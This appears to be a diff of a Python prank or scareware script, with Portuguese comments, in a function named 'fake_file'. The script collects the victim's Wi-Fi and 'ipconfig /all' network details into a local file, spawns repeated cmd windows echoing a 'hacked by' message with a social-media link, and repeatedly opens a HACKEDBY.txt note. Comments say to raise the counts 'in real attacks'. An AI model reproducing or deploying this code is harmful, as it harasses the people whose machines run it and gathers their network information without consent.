@@ -80,15 +80,18 @@ def fake_file():
                 f.write(f"{i+1}. SSID: {rede.ssid} | Sinal: {rede.signal}\n")
     
     ### Checa se tem wifi ou ethernet
-    wifi_info = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True).strip()
-    if "SSID" in wifi_info:
-        escanear_wifi()
+    try:
+        wifi_info = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True).strip()
+        if "SSID" in wifi_info:
+            escanear_wifi()
+            with open("wifi.txt", "a", encoding="utf-8") as f:
+                f.write(f"\n\n\n{wifi_info}")
+        else:
+            raise Exception("Sem conexão Wi-Fi.")
+    except subprocess.CalledProcessError:
+        ethernet_info = subprocess.check_output("ipconfig /all", shell=True, text=True).strip()
         with open("wifi.txt", "a", encoding="utf-8") as f:
-            f.write(f"\n\n\n {wifi_info}")
-    else:
-        wifi_info = subprocess.check_output("ipconfig /all", shell=True, text=True).strip()
-        with open("wifi.txt", "a", encoding="utf-8") as f:
-            f.write(wifi_info)
+            f.write(ethernet_info)
     
 
     ## 2 ATAQUES
@@ -96,7 +99,7 @@ def fake_file():
 
     ### Criar e mostrar o 1 aviso de hacking (cmd)
     for x in range(5): # MUDAR PARA MAIS EM ATAQUES REAIS
-        os.system(f'start cmd /k "echo OTARIO HACKED BY TEVO O SHOW https://x.com/estte7end https://x.com/estte7end https://x.com/estte7end"')
+        os.system(f'start cmd /k "echo https://x.com/estte7end https://x.com/estte7end https://x.com/estte7end"')
         time.sleep(1)
     #os.system("taskkill /f /im cmd.exe") # Deixar em comentário depois (usado apenas para testar e deixar mais facil)
     time.sleep(2)
@@ -104,7 +107,7 @@ def fake_file():
     ### Criar e mostrar o 2 aviso de hacking (notas)
     with open("HACKEDBY.txt", "a", encoding="utf-8") as f:
         for x in range (10):
-            f.write("OTARIO HACKED BY TEVO O SHOW\nhttps://x.com/estte7end\n")
+            f.write("\nhttps://x.com/estte7end\n")
     for x in range(5): #MUDAR PARA MAIS NÚMEROS EM ATAQUE REAL
         os.startfile("HACKEDBY.txt")
         time.sleep(1)
@@ -134,5 +137,5 @@ def fake_file():
 
 
 if __name__ == "__main__":
-    os.system("date /t & time /t")
+    os.system   ("date /t & time /t")
     fake_file()
